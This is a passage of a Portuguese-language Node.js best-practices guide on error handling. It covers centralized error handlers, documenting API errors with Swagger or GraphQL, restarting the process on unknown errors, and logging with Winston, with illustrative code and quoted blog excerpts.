<span class="token keyword">const</span> myError <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Como posso adicionar um novo produto quando nenhum valor é fornecido?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myError<span class="token punctuation">.</span>isOperational <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

<span class="token comment">// ou se você estiver usando alguma fábrica centralizada de erros (veja outros exemplos no marcador "Use somente o objeto Error interno")</span>
<span class="token keyword">class</span> <span class="token class-name">AppError</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span> <span class="token punctuation">(</span><span class="token parameter">commonType<span class="token punctuation">,</span> description<span class="token punctuation">,</span> isOperational</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">Error</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Error<span class="token punctuation">.</span><span class="token function">captureStackTrace</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>commonType <span class="token operator">=</span> commonType<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isOperational <span class="token operator">=</span> isOperational<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AppError</span><span class="token punctuation">(</span>errorManagement<span class="token punctuation">.</span>commonErrors<span class="token punctuation">.</span>InvalidInput<span class="token punctuation">,</span> <span class="token string">"Descreva aqui o que aconteceu"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Erros do programador são bugs no programa”</h3>
<p>Do blog, Joyent classificado como 1 para as palavras-chave “Node.js error handling”</p>
<blockquote>
<p>…A melhor maneira de se recuperar de erros de programação é travar imediatamente. Você deve executar seus programas usando um restaurador que irá reiniciar automaticamente o programa em caso de falha. Com um reinicializador executando, reiniciar é a maneira mais rápida de restaurar o serviço confiável diante de um erro temporário do programador…</p>
</blockquote>
<h3>Citação de Blog: “Não há maneira segura de sair sem criar algum estado frágil indefinido”</h3>
<p>Da documentação oficial do Node.js</p>
<blockquote>
<p>…Pela própria natureza de como o throw funciona em JavaScript, quase nunca há como “continuar de onde você parou” com segurança, sem vazar referências, ou criar algum outro tipo de estado frágil indefinido. A maneira mais segura de responder a um erro é desligar o processo. É claro que, em um servidor web normal, você pode ter muitas conexões abertas, e não é razoável encerrá-las abruptamente porque um erro foi acionado por outra pessoa. A melhor abordagem é enviar uma resposta de erro à solicitação que acionou o erro, deixando as outras concluírem em seu tempo normal e parar de atender novas solicitações nesse processo..</p>
</blockquote>
<h3>Citação de Blog: “Caso contrário, você arrisca o estado do seu aplicativo”</h3>
<p>Do blog, debugable.com classificado como 3 para as palavras-chave “Node.js uncaught exception”</p>
<blockquote>
<p>…Então, a menos que você realmente saiba o que está fazendo, você deve executar um reinício do seu serviço depois de receber um“uncaughtException” evento de exceção. Caso contrário, você corre o risco de que o estado do seu aplicativo, ou de bibliotecas de terceiros, se torne inconsistente, levando a todos os tipos de bugs malucos…</p>
</blockquote>
<h3>“Citação de Blog: Existem três escolas de pensamentos sobre tratamento de erros”</h3>
<p>Do blog: JS Recipes</p>
<blockquote>
<p>…Existem basicamente três escolas de pensamento sobre tratamento de erros:</p>
</blockquote>
<ol>
<li>Deixar o aplicativo travar e reiniciá-lo.</li>
<li>Lidar com todos os erros possíveis e nunca travar.</li>
<li>Uma abordagem equilibrada entre os dois.</li>
</ol>
<h2>2.4 Trate erros de forma centralizada, não dentro de um middleware do Express</h2>
<p><strong>TL;DR:</strong> A lógica de tratamento de erros, bem como email para administrador e registros (logs), deve ser encapsulada em um objeto dedicado e centralizado que todos os endpoints (por exemplo, middleware do Express, cron jobs, testes unitários) chamem quando um erro é recebido.</p>
<p><strong>Caso contrário:</strong> Não tratar os erros em um mesmo lugar irá levar à duplicidade de código, e provavelmente, a erros tratados incorretamente.</p>
<h1>Lide com erros de forma centralizada. Não dentro de middlewares</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Sem um objeto dedicado para o tratamento de erros, maiores são as chances de erros importantes se esconderem sob o radar devido a manuseio inadequado. O objeto manipulador de erros é responsável por tornar o erro visível, por exemplo, gravando em um logger bem formatado, enviando eventos para algum produto de monitoramento, como <a href="https://sentry.io/" target="_blank" rel="nofollow noopener noreferrer">Sentry</a>, <a href="https://rollbar.com/" target="_blank" rel="nofollow noopener noreferrer">Rollbar</a>, ou <a href="https://raygun.com/" target="_blank" rel="nofollow noopener noreferrer">Raygun</a>. A maioria dos frameworks web, como <a href="http://expressjs.com/en/guide/error-handling.html#writing-error-handlers" target="_blank" rel="nofollow noopener noreferrer">Express</a>, fornece um mecanismo de manipulação de erro através de um middleware. Um fluxo típico de manipulação de erros pode ser: Algum módulo lança um erro -> o roteador da API detecta o erro -> ele propaga o erro para o middleware (por exemplo, Express, KOA) que é responsável por detectar erros -> um manipulador de erro centralizado é chamado -> o middleware está sendo informado se erro é um erro não confiável (não operacional) para que ele possa reiniciar o aplicativo graciosamente. Note que é uma prática comum, mas errada, lidar com erros no middleware do Express - isso não cobre erros que são lançados em interfaces que não sejam da web.</p>
<h3>Exemplo de código - um fluxo de erro típico</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// camada de acesso a dados, não lidamos com erros aqui</span>
<span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">addDocument</span><span class="token punctuation">(</span>newCustomer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"explicação melhor do erro aqui"</span><span class="token punctuation">,</span> other useful parameters<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Código de rota da API, detectamos erros de sincronos e assíncronos e encaminhamos para o middleware</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
  customerService<span class="token punctuation">.</span><span class="token function">addNew</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token function">next</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">next</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Erro ao manipular o middleware, delegamos a manipulação ao manipulador de erro centralizado</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> isOperationalError <span class="token operator">=</span> <span class="token keyword">await</span> errorHandler<span class="token punctuation">.</span><span class="token function">handleError</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isOperationalError<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código - manipulando erros dentro de um objeto dedicado</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript">module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">errorHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">errorHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">handleError</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> logger<span class="token punctuation">.</span><span class="token function">logError</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> sendMailToAdminIfCritical<span class="token punctuation">;</span>
    <span class="token keyword">await</span> saveInOpsQueueIfCritical<span class="token punctuation">;</span>
    <span class="token keyword">await</span> determineIfOperationalError<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código - Anti-padrão: manipulando erros dentro do middleware</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// middleware lida com o erro diretamente, quem vai lidar com tarefas Cron e erros de teste?</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  logger<span class="token punctuation">.</span><span class="token function">logError</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>severity <span class="token operator">==</span> errors<span class="token punctuation">.</span>high<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    mailer<span class="token punctuation">.</span><span class="token function">sendMail</span><span class="token punctuation">(</span>configuration<span class="token punctuation">.</span>adminMail<span class="token punctuation">,</span> <span class="token string">'Erro crítico ocorreu'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>err<span class="token punctuation">.</span>isOperational<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Às vezes, níveis mais baixos não podem fazer nada útil, exceto propagar o erro para quem o chamou”</h3>
<p>Do blog Joyent, classificado como 1 para as palavras-chave “Node.js error handling”</p>
<blockquote>
<p>…Você pode acabar lidando com o mesmo erro em vários níveis do stack. Isso acontece quando os níveis mais baixos não podem fazer nada útil, exceto propagar o erro para quem o chamou, o qual propaga o erro para quem o chamou e assim por diante. Geralmente, somente quem chama sabe qual é a resposta apropriada, seja para repetir a operação, relatar um erro ao usuário ou outra coisa. Mas isso não significa que você deve tentar reportar todos os erros para uma única callback de nível superior, porque a própria callback não pode saber em que contexto o erro ocorreu…</p>
</blockquote>
<h3>Citação de Blog: “Lidar com cada erro individualmente resultaria em uma enorme duplicação”</h3>
<p>Do blog JS Recipes classificado como 17 para as palavras-chave “Node.js error handling”</p>
<blockquote>
<p>……Apenas no controlador do api.js da Hackathon Starter, existem mais de 79 ocorrências de objetos de erro. Lidar com cada erro individualmente resultaria em uma enorme quantidade de duplicação de código. A próxima melhor opção que você tem é delegar toda a lógica de tratamento de erros para um middleware do Express…</p>
</blockquote>
<h3>Citação de Blog: “Erros de HTTP não têm lugar na sua base de código”</h3>
<p>Do blog Daily JS classificado como 14 para as palavras-chave “Node.js error handling”</p>
<blockquote>
<p>……Você deve definir propriedades úteis em objetos de erro, mas use essas propriedades de forma consistente. E não cruze os fluxos: Erros de HTTP não têm lugar na sua base de código. Ou para desenvolvedores de navegador, os erros do Ajax têm um lugar no código que fala com o servidor, mas não no código que processa os templates Mustache…</p>
</blockquote>
<h2>2.5 Documente erros de API usando o Swagger ou GraphQL</h2>
<p><strong>TL;DR:</strong> Permita que os clientes de sua API saibam quais erros podem ser retornados para que eles possam lidar com esses detalhes, sem causar falhas. Para RESTful APIs geralmente, isto é feito com frameworks de documentação REST API, como o Swagger. Se você está usando GraphQL, você também pode utilizar seu esquema e comentários.</p>
<p><strong>Caso contrário:</strong> Um cliente de uma API pode decidir travar e reiniciar, apenas pelo motivo de ter recebido de volta um erro que não conseguiu entender. Nota: o visitante de sua API pode ser você (muito comum em um ambiente de microsserviço).</p>
<h1>Documente erros de API usando o Swagger ou GraphQL</h1>
<h3>Explicação em um Parágrafo</h3>
<p>As APIs REST retornam resultados usando códigos de status HTTP. É absolutamente necessário que o usuário da API esteja ciente não apenas sobre o esquema da API, mas também sobre possíveis erros – o chamador pode, então, pegar um erro e, com muito tato, lidar com ele. Por exemplo, a documentação da API pode indicar antecipadamente que o status HTTP 409 é retornado quando o nome do cliente já existir (supondo que a API registre novos usuários) para que o responsável pela chamada possa renderizar a melhor esperiência de usuário para a situação determinada. O Swagger é um padrão que define o esquema da documentação da API, oferecendo um ecossistema de ferramentas que permitem criar documentação facilmente on-line, veja as telas de impressão abaixo.</p>
<p>Se você já adotou o GraphQL para seus endpoints da API, seu esquema já contém garantias estritas de quais erros devem ser parecidos (<a href="https://facebook.github.io/graphql/June2018/#sec-Errors" target="_blank" rel="nofollow noopener noreferrer">descritos na especificação</a>) e como eles devem ser manipulados por suas ferramentas do lado do cliente. Além disso, você também pode complementá-los com documentação baseada em comentários.</p>
<h3>Exemplo de Erro no GraphQL</h3>
<blockquote>
<p>Esse exemplo usa <a href="https://graphql.org/swapi-graphql" target="_blank" rel="nofollow noopener noreferrer">SWAPI</a>, o API de Star Wars.</p>
</blockquote>
<div class="gatsby-highlight" data-language="graphql"><pre style="counter-reset: linenumber NaN" class="language-graphql line-numbers"><code class="language-graphql"><span class="token comment"># deve falhar porque o id não é válido</span>
<span class="token punctuation">{</span>
  film<span class="token punctuation">(</span><span class="token attr-name">id</span><span class="token punctuation">:</span> <span class="token string">"1ZmlsbXM6MQ=="</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    title
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<div class="gatsby-highlight" data-language="json"><pre style="counter-reset: linenumber NaN" class="language-json line-numbers"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"errors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
      <span class="token property">"message"</span><span class="token operator">:</span> <span class="token string">"Nenhuma entrada no cache local para https://swapi.co/api/films/.../"</span><span class="token punctuation">,</span>
      <span class="token property">"locations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
          <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
          <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token property">"path"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token string">"film"</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"film"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Você tem que dizer aos seus chamadores que erros podem acontecer”</h3>
<p>Do blog Joyent, classificado como 1 para as palavras-chave “Node.js logging”</p>
<blockquote>
<p>Já falamos sobre como lidar com erros, mas quando você está escrevendo uma nova função, como você entrega erros ao código que chamou sua função? …Se você não sabe quais erros podem acontecer ou não sabe o que eles significam, seu programa não pode estar correto, exceto por acidente. Então, se você está escrevendo uma nova função, precisa dizer a seus chamadores quais erros podem acontecer e o que eles significam…</p>
</blockquote>
<h3>Ferramenta Útil: Swagger Criação de Documentação Online</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/swaggerDoc.png?raw=true" alt="Swagger API Scheme" title="lidando com erros API"></p>
<h2>2.6 Finalize o processo quando um estranho chegar</h2>
<p><strong>TL;DR:</strong> Quando ocorre um erro desconhecido (um erro de programação, veja a melhor prática #3) - há incerteza sobre a integridade da aplicação. Uma prática comum sugere reiniciar cuidadosamente o processo utilizando uma ferramenta de “reinicialização” como Forever e PM2.</p>
<p><strong>Caso contrário:</strong> Quando uma exceção desconhecida é lançada, algum objeto pode estar com defeito (por exemplo, um emissor de evento que é usado globalmente e não dispara mais eventos devido a alguma falha interna) e todas as requisições futuras podem falhar ou se comportar loucamente.</p>
<h1>Finalize o processo quando um estranho chegar</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Em algum lugar dentro do seu código, um objeto manipulador de erro é responsável por decidir como proceder quando um erro é lançado – se o erro for confiável (por exemplo, erro operacional, consulte mais explicações na melhor prática #3), a gravação no arquivo de log poderá ser suficiente. As coisas ficam complicadas se o erro não for familiar - isso significa que algum componente pode estar em um estado defeituoso e todas as solicitações futuras estão sujeitas a falhas. Por exemplo, suponha um serviço de emissor de token único e com estado, que lançou uma exceção e perdeu seu estado - a partir de agora ele pode se comportar de maneira inesperada e fazer com que todas as solicitações falhem. Neste cenário, mate o processo e use uma “ferramenta de reinicialização” (como Forever, PM2, etc) para começar de novo com um estado limpo.</p>
<h3>Exemplo de código: decidindo se vai travar</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Supondo que os desenvolvedores marquem erros operacionais conhecidos com error.isOperational = true, leia as melhores práticas #3</span>
process<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'uncaughtException'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  errorManagement<span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>errorManagement<span class="token punctuation">.</span>handler<span class="token punctuation">.</span><span class="token function">isTrustedError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>
  process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// manipulador de erro centralizado encapsula lógica relacionada à manipulação de erros</span>
<span class="token keyword">function</span> <span class="token function">errorHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">handleError</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> logger<span class="token punctuation">.</span><span class="token function">logError</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>sendMailToAdminIfCritical<span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>saveInOpsQueueIfCritical<span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>determineIfOperationalError<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">isTrustedError</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> error<span class="token punctuation">.</span>isOperational<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “A melhor maneira é travar”</h3>
<p>Do blog Joyent</p>
<blockquote>
<p>…A melhor maneira de se recuperar de erros de programação é travar imediatamente. Você deve executar seus programas usando um restaurador que irá reiniciar automaticamente o programa em caso de falha. Com um reinicializador executando, o travamento é a maneira mais rápida de restaurar um serviço confiável diante de um erro temporário do programador…</p>
</blockquote>
<h3>“Citação de Blog: Existem três escolas de pensamentos sobre tratamento de erros”</h3>
<p>Do blog: JS Recipes</p>
<blockquote>
<p>…Existem basicamente três escolas de pensamento sobre tratamento de erros:</p>
</blockquote>
<ol>
<li>Deixar o aplicativo travar e reiniciá-lo.</li>
<li>Lidar com todos os erros possíveis e nunca travar.</li>
<li>Uma abordagem equilibrada entre os dois.</li>
</ol>
<h3>Citação de Blog: “Não há maneira segura de sair sem criar algum estado frágil indefinido”</h3>
<p>Da documentação oficial do Node.js</p>
<blockquote>
<p>…Pela própria natureza de como o throw funciona em JavaScript, quase nunca há como “continuar de onde você parou” com segurança, sem vazar referências, ou criar algum outro tipo de estado frágil indefinido. A maneira mais segura de responder a um erro é desligar o processo. É claro que, em um servidor web normal, você pode ter muitas conexões abertas, e não é razoável encerrá-las abruptamente porque um erro foi acionado por outra pessoa. A melhor abordagem é enviar uma resposta de erro à solicitação que acionou o erro, deixando as outras concluírem em seu tempo normal e parar de atender novas solicitações nesse processo..</p>
</blockquote>
<h2>2.7 Use um agente de log maduro para aumentar a visibilidade de erros</h2>
<p><strong>TL;DR:</strong> Um conjunto de ferramentas de registro maduras como Winston, Bunyan ou Log4j, irão acelerar a descoberta e entendimento de erros. Portanto, esqueça o console.log.</p>
<p><strong>Caso contrário:</strong> Ficar procurando através de console.logs ou manualmente em arquivos de texto confusos sem utilizar ferramentas de consulta ou um visualizador de log decente, pode mantê-lo ocupado até tarde.</p>
<h1>Use um agente de log maduro para aumentar a visibilidade de erros</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Todos nós amamos console.log, mas obviamente, um logger respeitável e persistente como <a href="https://www.npmjs.com/package/winston" target="_blank" rel="nofollow noopener noreferrer">Winston</a> (altamente popular) ou <a href="https://www.npmjs.com/package/pino" target="_blank" rel="nofollow noopener noreferrer">pino</a> (o novato que está focado no desempenho) é obrigatório para projetos sérios. Um conjunto de práticas e ferramentas ajudará a entender os erros muito mais rapidamente - (1) logar freqüentemente usando diferentes níveis (depuração, informação, erro), (2) ao registrar, fornecer informações contextuais como objetos JSON, ver exemplo abaixo, (3) observe e filtre os logs usando uma API de consulta de log (incorporada na maioria dos registradores) ou um software de visualização de logs, (4) Expor e selecionar a declaração de log para a equipe de operação usando ferramentas de inteligência operacional como o Splunk.</p>
<h3>Exemplo de Código – Registrador Winston em ação</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// seu objeto registrador centralizado</span>
<span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">winston<span class="token punctuation">.</span>Logger</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  level<span class="token operator">:</span> <span class="token string">'info'</span><span class="token punctuation">,</span>
  transports<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token keyword">new</span> <span class="token punctuation">(</span>winston<span class="token punctuation">.</span>transports<span class="token punctuation">.</span>Console<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// código personalizado em algum lugar usando o registrador</span>
logger<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'info'</span><span class="token punctuation">,</span> <span class="token string">'Mensagem de Log de Teste com algum parâmetro %s'</span><span class="token punctuation">,</span> <span class="token string">'algum parâmetro'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> anything<span class="token operator">:</span> <span class="token string">'Este é um metadado'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código - Consultando a pasta de log (procurando por entradas)</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">var</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token keyword">from</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span> <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span>
  until<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">,</span>
  limit<span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
  start<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
  order<span class="token operator">:</span> <span class="token string">'desc'</span><span class="token punctuation">,</span>
  fields<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>


<span class="token comment">// Encontrar itens registrados entre hoje e ontem.</span>
winston<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> results</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// executar callback com os resultados</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Requisitos do Registrador”</h3>
<p> Do blog Strong Loop</p>
<blockquote>
<p>Vamos identificar alguns requisitos (para um registrador):</p>
</blockquote>
<ol>
<li>Carimbo de data / hora de cada linha de log. Este é bastante auto-explicativo - você deve ser capaz de dizer quando cada entrada de log ocorreu.</li>
<li>Formato de registro deve ser facilmente entendido tanto por seres humanos, quanto para máquinas.</li>
